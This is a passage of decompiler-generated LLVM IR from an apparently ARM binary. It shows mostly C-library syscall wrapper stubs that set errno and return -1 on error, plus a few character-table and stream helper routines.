  %v3_1054c = load i32, i32* @r7, align 4
  store i32 %v3_1054c, i32* %stack_var_-8, align 4
  %v0_10558 = load i32, i32* @r0, align 4
  store i32 %v0_10558, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10558, -4095
  br i1 %tmp, label %dec_label_pc_10578, label %dec_label_pc_10568

dec_label_pc_10568:                               ; preds = %dec_label_pc_1054c
  %v0_10568 = call i32 @function_1095c()
  %v0_1056c = load i32, i32* %r7.global-to-local, align 4
  %v1_1056c = sub i32 0, %v0_1056c
  %v2_10570 = inttoptr i32 %v0_10568 to i32*
  store i32 %v1_1056c, i32* %v2_10570, align 4
  %v2_10578.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10578

dec_label_pc_10578:                               ; preds = %dec_label_pc_1054c, %dec_label_pc_10568
  %v1_1057c = phi i32 [ %v0_10558, %dec_label_pc_1054c ], [ -1, %dec_label_pc_10568 ]
  %v2_10578 = phi i32 [ %v3_1054c, %dec_label_pc_1054c ], [ %v2_10578.pre, %dec_label_pc_10568 ]
  store i32 %v2_10578, i32* @r7, align 4
  ret i32 %v1_1057c

; uselistorder directives
  uselistorder i32 %v0_10558, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10578, { 1, 0 }
}

define i32 @function_10580(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10580:
  %v0_1058c = call i32 @function_150dc()
  ret i32 %v0_1058c
}

define i32 @function_1059c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1059c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_105cc, label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %dec_label_pc_1059c
  %v0_105bc = call i32 @function_1095c()
  %v0_105c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_105c0 = sub i32 0, %v0_105c0
  %v2_105c4 = inttoptr i32 %v0_105bc to i32*
  store i32 %v1_105c0, i32* %v2_105c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %dec_label_pc_1059c, %dec_label_pc_105bc
  %v0_105cc = phi i32 [ %arg1, %dec_label_pc_1059c ], [ -1, %dec_label_pc_105bc ]
  ret i32 %v0_105cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_105cc, { 1, 0 }
}

define i32 @function_105dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_105dc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_105dc = load i32, i32* @r7, align 4
  store i32 %v3_105dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10604, label %dec_label_pc_105f4

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105dc
  %v0_105f4 = call i32 @function_1095c()
  %v0_105f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_105f8 = sub i32 0, %v0_105f8
  %v2_105fc = inttoptr i32 %v0_105f4 to i32*
  store i32 %v1_105f8, i32* %v2_105fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10608.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %dec_label_pc_105dc, %dec_label_pc_105f4
  %v2_10608 = phi i32 [ %v3_105dc, %dec_label_pc_105dc ], [ %v2_10608.pre, %dec_label_pc_105f4 ]
  %v0_10604 = phi i32 [ %arg1, %dec_label_pc_105dc ], [ -1, %dec_label_pc_105f4 ]
  store i32 %v2_10608, i32* @r7, align 4
  ret i32 %v0_10604

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10604, { 1, 0 }
}

define i32 @function_10610(i32 %arg1) local_unnamed_addr {
dec_label_pc_10610:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10610 = load i32, i32* @r7, align 4
  store i32 %v3_10610, i32* %stack_var_-8, align 4
  %v0_1061c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1061c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1061c, -4095
  br i1 %tmp, label %dec_label_pc_1063c, label %dec_label_pc_1062c

dec_label_pc_1062c:                               ; preds = %dec_label_pc_10610
  %v0_1062c = call i32 @function_1095c()
  %v0_10630 = load i32, i32* %r7.global-to-local, align 4
  %v1_10630 = sub i32 0, %v0_10630
  %v2_10634 = inttoptr i32 %v0_1062c to i32*
  store i32 %v1_10630, i32* %v2_10634, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1063c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10610, %dec_label_pc_1062c
  %v1_10640 = phi i32 [ %v0_1061c, %dec_label_pc_10610 ], [ -1, %dec_label_pc_1062c ]
  %v2_1063c = phi i32 [ %v3_10610, %dec_label_pc_10610 ], [ %v2_1063c.pre, %dec_label_pc_1062c ]
  store i32 %v2_1063c, i32* @r7, align 4
  ret i32 %v1_10640

; uselistorder directives
  uselistorder i32 %v0_1061c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
}

define i32 @function_10644() local_unnamed_addr {
dec_label_pc_10644:
  %stack_var_-16 = alloca i32, align 4
  %v2_10648 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10654 = call i32 @function_151b4(i32 7, i32 %v2_10648)
  %v1_10658 = icmp slt i32 %v2_10654, 0
  %v5_1065c = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_10658, i32 256, i32 %v5_1065c
  ret i32 %storemerge
}

define i32 @function_10670(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10670:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10670 = load i32, i32* @r7, align 4
  store i32 %v3_10670, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10698, label %dec_label_pc_10688

dec_label_pc_10688:                               ; preds = %dec_label_pc_10670
  %v0_10688 = call i32 @function_1095c()
  %v0_1068c = load i32, i32* %r7.global-to-local, align 4
  %v1_1068c = sub i32 0, %v0_1068c
  store i32 %v1_1068c, i32* @r3, align 4
  %v2_10690 = inttoptr i32 %v0_10688 to i32*
  store i32 %v1_1068c, i32* %v2_10690, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1069c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10670, %dec_label_pc_10688
  %v2_1069c = phi i32 [ %v3_10670, %dec_label_pc_10670 ], [ %v2_1069c.pre, %dec_label_pc_10688 ]
  %v0_10698 = phi i32 [ %arg1, %dec_label_pc_10670 ], [ -1, %dec_label_pc_10688 ]
  store i32 %v2_1069c, i32* @r7, align 4
  ret i32 %v0_10698

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10698, { 1, 0 }
}

define i32 @function_106a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106a4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_106a4 = load i32, i32* @r7, align 4
  store i32 %v3_106a4, i32* %stack_var_-8, align 4
  %v0_106b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_106b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_106b0, -4095
  br i1 %tmp, label %dec_label_pc_106d0, label %dec_label_pc_106c0

dec_label_pc_106c0:                               ; preds = %dec_label_pc_106a4
  %v0_106c0 = call i32 @function_1095c()
  %v0_106c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_106c4 = sub i32 0, %v0_106c4
  %v2_106c8 = inttoptr i32 %v0_106c0 to i32*
  store i32 %v1_106c4, i32* %v2_106c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_106d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_106d0

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106a4, %dec_label_pc_106c0
  %v1_106d4 = phi i32 [ %v0_106b0, %dec_label_pc_106a4 ], [ -1, %dec_label_pc_106c0 ]
  %v2_106d0 = phi i32 [ %v3_106a4, %dec_label_pc_106a4 ], [ %v2_106d0.pre, %dec_label_pc_106c0 ]
  store i32 %v2_106d0, i32* @r7, align 4
  ret i32 %v1_106d4

; uselistorder directives
  uselistorder i32 %v0_106b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106d0, { 1, 0 }
}

define i32 @function_106d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106d8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10714 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10714, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10714, -4095
  br i1 %tmp, label %dec_label_pc_10734, label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_106d8
  %v0_10724 = call i32 @function_1095c()
  %v0_10728 = load i32, i32* %r7.global-to-local, align 4
  %v1_10728 = sub i32 0, %v0_10728
  %v2_1072c = inttoptr i32 %v0_10724 to i32*
  store i32 %v1_10728, i32* %v2_1072c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_106d8, %dec_label_pc_10724
  %v1_10740 = phi i32 [ %v0_10714, %dec_label_pc_106d8 ], [ -1, %dec_label_pc_10724 ]
  ret i32 %v1_10740

; uselistorder directives
  uselistorder i32 %v0_10714, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10734, { 1, 0 }
}

define i32 @function_10744(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10744:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10780 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10780, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10780, -4095
  br i1 %tmp, label %dec_label_pc_107a0, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10744
  %v0_10790 = call i32 @function_1095c()
  %v0_10794 = load i32, i32* %r7.global-to-local, align 4
  %v1_10794 = sub i32 0, %v0_10794
  %v2_10798 = inttoptr i32 %v0_10790 to i32*
  store i32 %v1_10794, i32* %v2_10798, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107a0

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10744, %dec_label_pc_10790
  %v1_107ac = phi i32 [ %v0_10780, %dec_label_pc_10744 ], [ -1, %dec_label_pc_10790 ]
  ret i32 %v1_107ac

; uselistorder directives
  uselistorder i32 %v0_10780, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107a0, { 1, 0 }
}

define i32 @function_107b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_107b0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107b0 = load i32, i32* @r7, align 4
  store i32 %v3_107b0, i32* %stack_var_-8, align 4
  %v0_107bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_107bc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107bc, -4095
  br i1 %tmp, label %dec_label_pc_107dc, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_107b0
  %v0_107cc = call i32 @function_1095c()
  %v0_107d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_107d0 = sub i32 0, %v0_107d0
  %v2_107d4 = inttoptr i32 %v0_107cc to i32*
  store i32 %v1_107d0, i32* %v2_107d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_107dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107b0, %dec_label_pc_107cc
  %v1_107e0 = phi i32 [ %v0_107bc, %dec_label_pc_107b0 ], [ -1, %dec_label_pc_107cc ]
  %v2_107dc = phi i32 [ %v3_107b0, %dec_label_pc_107b0 ], [ %v2_107dc.pre, %dec_label_pc_107cc ]
  store i32 %v2_107dc, i32* @r7, align 4
  ret i32 %v1_107e0

; uselistorder directives
  uselistorder i32 %v0_107bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107dc, { 1, 0 }
}

define i32 @function_107e4() local_unnamed_addr {
dec_label_pc_107e4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107e4 = load i32, i32* @r7, align 4
  store i32 %v3_107e4, i32* %stack_var_-8, align 4
  %v0_107f0 = load i32, i32* @r0, align 4
  store i32 %v0_107f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107f0, -4095
  br i1 %tmp, label %dec_label_pc_10810, label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107e4
  %v0_10800 = call i32 @function_1095c()
  %v0_10804 = load i32, i32* %r7.global-to-local, align 4
  %v1_10804 = sub i32 0, %v0_10804
  %v2_10808 = inttoptr i32 %v0_10800 to i32*
  store i32 %v1_10804, i32* %v2_10808, align 4
  %v2_10810.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10810

dec_label_pc_10810:                               ; preds = %dec_label_pc_107e4, %dec_label_pc_10800
  %v1_10814 = phi i32 [ %v0_107f0, %dec_label_pc_107e4 ], [ -1, %dec_label_pc_10800 ]
  %v2_10810 = phi i32 [ %v3_107e4, %dec_label_pc_107e4 ], [ %v2_10810.pre, %dec_label_pc_10800 ]
  store i32 %v2_10810, i32* @r7, align 4
  ret i32 %v1_10814

; uselistorder directives
  uselistorder i32 %v0_107f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10810, { 1, 0 }
}

define i32 @function_10818(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10818:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10818 = load i32, i32* @r3, align 4
  store i32 %v9_10818, i32* %stack_var_-4, align 4
  %v2_10824 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10824, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10858, label %dec_label_pc_10848

dec_label_pc_10848:                               ; preds = %dec_label_pc_10818
  %v0_10848 = call i32 @function_1095c()
  %v0_1084c = load i32, i32* %r7.global-to-local, align 4
  %v1_1084c = sub i32 0, %v0_1084c
  store i32 %v1_1084c, i32* @r3, align 4
  %v2_10850 = inttoptr i32 %v0_10848 to i32*
  store i32 %v1_1084c, i32* %v2_10850, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10818, %dec_label_pc_10848
  %v0_10858 = phi i32 [ %arg1, %dec_label_pc_10818 ], [ -1, %dec_label_pc_10848 ]
  ret i32 %v0_10858

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10858, { 1, 0 }
}

define i32 @function_1086c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1086c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10870.outer

dec_label_pc_10870.outer:                         ; preds = %dec_label_pc_10888, %dec_label_pc_1086c
  %v0_10870.ph = phi i32 [ %v0_10870.pre.pre, %dec_label_pc_10888 ], [ %arg1, %dec_label_pc_1086c ]
  %tmp = icmp ult i32 %v0_10870.ph, -4095
  br label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %dec_label_pc_10870.outer, %dec_label_pc_10870
  br i1 %tmp, label %dec_label_pc_10870, label %dec_label_pc_10888

dec_label_pc_10888:                               ; preds = %dec_label_pc_10870
  %v0_10888 = call i32 @function_1095c()
  %v1_1088c = sub i32 0, %v0_10870.ph
  %v2_10890 = inttoptr i32 %v0_10888 to i32*
  store i32 %v1_1088c, i32* %v2_10890, align 4
  %v0_10870.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10870.outer

; uselistorder directives
  uselistorder i32 %v0_10870.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10870, { 1, 0 }
}

define i32 @function_10898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10898:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10898 = load i32, i32* @r7, align 4
  store i32 %v3_10898, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_108c4, label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %dec_label_pc_10898
  %v0_108b4 = call i32 @function_1095c()
  %v0_108b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_108b8 = sub i32 0, %v0_108b8
  %v2_108bc = inttoptr i32 %v0_108b4 to i32*
  store i32 %v1_108b8, i32* %v2_108bc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_108c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_10898, %dec_label_pc_108b4
  %v2_108c8 = phi i32 [ %v3_10898, %dec_label_pc_10898 ], [ %v2_108c8.pre, %dec_label_pc_108b4 ]
  %v0_108c4 = phi i32 [ %arg1, %dec_label_pc_10898 ], [ -1, %dec_label_pc_108b4 ]
  store i32 %v2_108c8, i32* @r7, align 4
  ret i32 %v0_108c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108c4, { 1, 0 }
}

define i32 @function_108d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_108d0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108d0 = load i32, i32* @r7, align 4
  store i32 %v3_108d0, i32* %stack_var_-8, align 4
  %v0_108dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_108dc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_108dc, -4095
  br i1 %tmp, label %dec_label_pc_108fc, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108d0
  %v0_108ec = call i32 @function_1095c()
  %v0_108f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_108f0 = sub i32 0, %v0_108f0
  %v2_108f4 = inttoptr i32 %v0_108ec to i32*
  store i32 %v1_108f0, i32* %v2_108f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_108fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108d0, %dec_label_pc_108ec
  %v1_10900 = phi i32 [ %v0_108dc, %dec_label_pc_108d0 ], [ -1, %dec_label_pc_108ec ]
  %v2_108fc = phi i32 [ %v3_108d0, %dec_label_pc_108d0 ], [ %v2_108fc.pre, %dec_label_pc_108ec ]
  store i32 %v2_108fc, i32* @r7, align 4
  ret i32 %v1_10900

; uselistorder directives
  uselistorder i32 %v0_108dc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
}

define i32 @function_10904(i32 %arg1) local_unnamed_addr {
dec_label_pc_10904:
  %v4_10910 = load i32, i32* inttoptr (i32 144528 to i32*), align 16
  %v2_10914 = mul i32 %arg1, 2
  %v2_10918 = add i32 %v4_10910, %v2_10914
  %v3_10918 = inttoptr i32 %v2_10918 to i16*
  %v4_10918 = load i16, i16* %v3_10918, align 2
  %v6_10918 = zext i16 %v4_10918 to i32
  %v1_1091c = and i32 %v6_10918, 32
  ret i32 %v1_1091c
}

define i32 @function_1092c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1092c:
  %v1_10930 = add i32 %arg1, 128
  %v2_10934 = icmp ugt i32 %v1_10930, 383
  %v0_1093c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10934, i32 %v0_1093c)
  %v4_10944 = load i32, i32* inttoptr (i32 144536 to i32*), align 8
  %v2_10948 = mul i32 %arg1, 2
  %v2_1094c = add i32 %v4_10944, %v2_10948
  %v3_1094c = inttoptr i32 %v2_1094c to i16*
  %v4_1094c = load i16, i16* %v3_1094c, align 2
  %v6_1094c = sext i16 %v4_1094c to i32
  ret i32 %v6_1094c
}

define i32 @function_1095c() local_unnamed_addr {
dec_label_pc_1095c:
  store i32 144312, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_29764.184 to i32)
}

define i32 @function_10978(i32 %arg1) local_unnamed_addr {
dec_label_pc_10978:
  %stack_var_-24 = alloca i32, align 4
  %v3_10978 = load i32, i32* @r4, align 4
  store i32 %v3_10978, i32* %stack_var_-24, align 4
  %v6_10978 = load i32, i32* @r5, align 4
  %v9_10978 = load i32, i32* @r6, align 4
  %v12_10978 = load i32, i32* @r7, align 4
  %v15_10978 = load i32, i32* @r8, align 4
  %v18_10978 = load i32, i32* @lr, align 4
  store i32 144312, i32* @r6, align 4
  %v4_10988 = load i32, i32* inttoptr (i32 144328 to i32*), align 8
  %v1_1098c = inttoptr i32 %v4_10988 to i32*
  %v2_1098c = load i32, i32* %v1_1098c, align 4
  store i32 %v2_1098c, i32* @r5, align 4
  %v1_10990 = add i32 %v2_1098c, 52
  %v2_10990 = inttoptr i32 %v1_10990 to i32*
  %v3_10990 = load i32, i32* %v2_10990, align 4
  %v1_10994 = sub i32 1, %v3_10990
  %v2_10994 = icmp ult i32 %v3_10990, 2
  br i1 %v2_10994, label %thread-pre-split, label %bb

bb:                                               ; preds = %dec_label_pc_10978
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10978, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_10994, %dec_label_pc_10978 ]
  %v0_1099c = phi i32 [ 0, %bb ], [ %v1_10994, %dec_label_pc_10978 ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_1099c = icmp eq i32 %v0_1099c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_1099c, label %dec_label_pc_109e4, label %dec_label_pc_109ac

dec_label_pc_109ac:                               ; preds = %thread-pre-split
  %v1_109b0 = add i32 %v2_1098c, 56
  store i32 %v1_109b0, i32* @r4, align 4
  %v4_109c4 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_109c4)
  %v0_109d8 = load i32, i32* @r6, align 4
  %v2_109d8 = add i32 %v0_109d8, 20
  %v3_109d8 = inttoptr i32 %v2_109d8 to i32*
  %v4_109d8 = load i32, i32* %v3_109d8, align 4
  store i32 %v4_109d8, i32* @ip, align 4
  store i32 68068, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_109d8)
  %v0_109e4.pre = load i32, i32* @r7, align 4
  %v0_109e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %thread-pre-split, %dec_label_pc_109ac
  %v0_109e8 = phi i32 [ %v2_1098c, %thread-pre-split ], [ %v0_109e8.pre, %dec_label_pc_109ac ]
  %v0_109e4 = phi i32 [ %arg1, %thread-pre-split ], [ %v0_109e4.pre, %dec_label_pc_109ac ]
  %v2_109ec = call i32 @function_11e48(i32 %v0_109e4, i32 %v0_109e8)
  %v7_109f0 = icmp eq i32 %v2_109ec, -1
  store i32 %v2_109ec, i32* @r4, align 4
  br i1 %v7_109f0, label %bb19, label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_109e4
  %v0_109fc = load i32, i32* @r5, align 4
  %v3_10a04 = call i32 @function_11d40(i8 10, i32 %v0_109fc)
  %v7_10a08 = icmp eq i32 %v3_10a04, -1
  br i1 %v7_10a08, label %bb18, label %.thread

bb18:                                             ; preds = %dec_label_pc_109fc
  store i32 %v3_10a04, i32* @r4, align 4
  br label %bb19

.thread:                                          ; preds = %dec_label_pc_109fc
  %v1_10a10.pre = load i32, i32* @r4, align 4
  %phitmp = add i32 %v1_10a10.pre, 1
  store i32 %phitmp, i32* @r4, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %dec_label_pc_109e4, %.thread
  %v0_10a14 = load i32, i32* @r8, align 4
  %v2_10a14 = icmp eq i32 %v0_10a14, 0
  br i1 %v2_10a14, label %bb19..thread7_crit_edge, label %bb20

bb19..thread7_crit_edge:                          ; preds = %bb19
  br label %.thread7

bb20:                                             ; preds = %bb19
  %v1_10a24 = load i32, i32* @r6, align 4
  %v3_10a24 = add i32 %v1_10a24, 28
  %v4_10a24 = inttoptr i32 %v3_10a24 to i32*
  br label %.thread7

.thread7:                                         ; preds = %bb19..thread7_crit_edge, %bb20
  %v0_10a2c.in = phi i32* [ @ip, %bb19..thread7_crit_edge ], [ %v4_10a24, %bb20 ]
  %v0_10a2c = load i32, i32* %v0_10a2c.in, align 4
  %v2_10a2c = xor i1 %v2_10a14, true
  call void @__pseudo_cond_branch(i1 %v2_10a2c, i32 %v0_10a2c)
  %v0_10a30 = load i32, i32* @r4, align 4
  %v2_10a38 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10a38, i32* @r4, align 4
  store i32 %v6_10978, i32* @r5, align 4
  store i32 %v9_10978, i32* @r6, align 4
  store i32 %v12_10978, i32* @r7, align 4
  store i32 %v15_10978, i32* @r8, align 4
  store i32 %v18_10978, i32* @lr, align 4
  ret i32 %v0_10a30

; uselistorder directives
  uselistorder i32 %v3_10a04, { 1, 0 }
  uselistorder i32 %v2_109ec, { 1, 0 }
  uselistorder i32 %v1_10994, { 1, 0 }
  uselistorder i32 %v3_10990, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109e4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_10a44(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a44:
  %v0_10a44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10a44, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10a44
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10a44, %bb
  %v10_10a54 = phi i32 [ %arg1, %dec_label_pc_10a44 ], [ 0, %bb ]
  ret i32 %v10_10a54

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_10a58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10a58:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  %v0_10a5c = load i32, i32* @lr, align 4
  %v4_10a70 = load i32, i32* inttoptr (i32 144328 to i32*), align 8
  %v2_10a74 = ptrtoint i32* %stack_var_-12 to i32
  %v1_10a78 = inttoptr i32 %v4_10a70 to i32*
  %v2_10a78 = load i32, i32* %v1_10a78, align 4
  %v10_10a88 = inttoptr i32 %v2_10a78 to i16*
  %v11_10a88 = call i32 @function_10c44(i16* %v10_10a88, i32 %arg1, i32 %v2_10a74, i32 %v2_10a74, i32 %v2_10a74, i32 %v0_10a5c, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v0_10a5c, i32* @lr, align 4
  ret i32 %v11_10a88

; uselistorder directives
  uselistorder i32 %v2_10a74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10aa0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10aa0:
  %v0_10aa0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10aa0, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_10aa0
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_10aa0, %bb
  %v0_10aa8 = call i32 @function_1095c()
  store i32 %v0_10aa8, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
